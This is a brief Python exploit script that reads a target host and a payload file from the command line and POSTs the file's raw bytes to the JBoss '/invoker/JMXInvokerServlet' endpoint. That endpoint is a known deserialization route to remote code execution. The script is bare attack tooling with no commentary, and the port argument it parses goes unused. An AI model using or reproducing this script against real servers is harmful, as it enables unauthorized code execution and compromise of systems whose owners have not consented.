#!/usr/bin/python
#-*- coding: UTF-8 -*- 
import requests
import sys 
host = sys.argv[1]
http = 'http://'
# https = 'https://'
ishttp = host.find(http)
# ishttps = host.find(https)
if ishttp<0:
	host = http + host
port = int(sys.argv[2])
payload = open(sys.argv[3],'rb').read()
URL = host + "/invoker/JMXInvokerServlet"
requests.post(URL, data=payload) 